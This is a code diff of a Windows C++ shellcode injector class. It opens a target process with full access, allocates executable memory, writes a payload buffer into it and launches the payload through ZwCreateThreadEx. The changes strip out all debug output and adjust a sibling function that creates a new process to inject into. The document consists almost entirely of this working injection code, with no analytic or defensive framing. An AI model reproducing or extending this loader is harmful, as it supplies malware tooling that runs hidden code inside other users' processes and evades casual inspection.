@@ -13,20 +13,12 @@ BOOL CodeInject::ZwCreateThreadExCodeInject(DWORD dwPid, CodeBuffer Buffer)
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
 	if (hProcess == NULL)	//此处不用INVALID_HANDLE_VALUE，这是个历史遗留的大坑，何时用它判断句柄，要看对应函数的返回值
 	{
-		if (DEBUG)
-		{
-			printf("OpenProcess Fail:%x\n", GetLastError());
-		}
 		return FALSE;
 	}
 
 	pRemoteBuffer = VirtualAllocEx(hProcess, NULL, Buffer.BufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!pRemoteBuffer)
 	{
-		if (DEBUG)
-		{
-			printf("VirtualAllocEx Fail:%x\n", GetLastError());
-		}
 		CloseHandle(hProcess);
 		return FALSE;
 	}
@@ -34,16 +26,8 @@ BOOL CodeInject::ZwCreateThreadExCodeInject(DWORD dwPid, CodeBuffer Buffer)
 	bFlag = WriteProcessMemory(hProcess, pRemoteBuffer, Buffer.pBuffer, Buffer.BufferSize, NULL);
 	if (!bFlag)
 	{
-		if (DEBUG)
-		{
-			printf("WriteProcessMemory Fail:%x\n", GetLastError());
-		}
 		CloseHandle(hProcess);
 		return FALSE;
-	}
-	else if(DEBUG)
-	{
-		printf("[*] ShellCode 加载地址 = 0x%p\n", pRemoteBuffer);
 	}
 
 	HMODULE hNtdll = NULL;
@@ -51,10 +35,6 @@ BOOL CodeInject::ZwCreateThreadExCodeInject(DWORD dwPid, CodeBuffer Buffer)
 	//hNtdll = LoadLibraryA("ntdll.dll");
 	if (!hNtdll)
 	{
-		if (DEBUG)
-		{
-			printf("GetNtdllModuleHandleA Fail:%x\n", GetLastError());
-		}
 		CloseHandle(hProcess);
 		return FALSE;
 	}
@@ -91,10 +71,6 @@ BOOL CodeInject::ZwCreateThreadExCodeInject(DWORD dwPid, CodeBuffer Buffer)
 	ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, "ZwCreateThreadEx");
 	if (ZwCreateThreadEx == NULL)
 	{
-		if (DEBUG)
-		{
-			printf("GetZwCreateThreadExProcAddress Fail:%x\n", GetLastError());
-		}
 		CloseHandle(hProcess);
 		return FALSE;
 	}
@@ -102,10 +78,6 @@ BOOL CodeInject::ZwCreateThreadExCodeInject(DWORD dwPid, CodeBuffer Buffer)
 	NTSTATUS ntStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
 	if (ntStatus < 0)
 	{
-		if (DEBUG)
-		{
-			printf("ZwCreateThreadEx Fail:%x\n", ntStatus);
-		}
 		CloseHandle(hProcess);
 		return FALSE;
 	}
@@ -118,7 +90,7 @@ BOOL CodeInject::ZwCreateThreadExCodeInject(DWORD dwPid, CodeBuffer Buffer)
 	return TRUE;
 }
 
-BOOL CodeInject::CreateProcessCodeInject(const WCHAR* pszTarget,CodeBuffer Buffer)
+BOOL CodeInject::CreateProcessCodeInject(const PCHAR pszTarget,CodeBuffer Buffer)
 {
 	STARTUPINFO start = { 0 };
 	PROCESS_INFORMATION ProcessInfo = { 0 };
@@ -126,7 +98,7 @@ BOOL CodeInject::CreateProcessCodeInject(const WCHAR* pszTarget,CodeBuffer Buffe
 
 	memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));
 
-	if (!CreateProcessW(
+	if (!CreateProcess(
 		pszTarget,
 		NULL,
 		NULL,
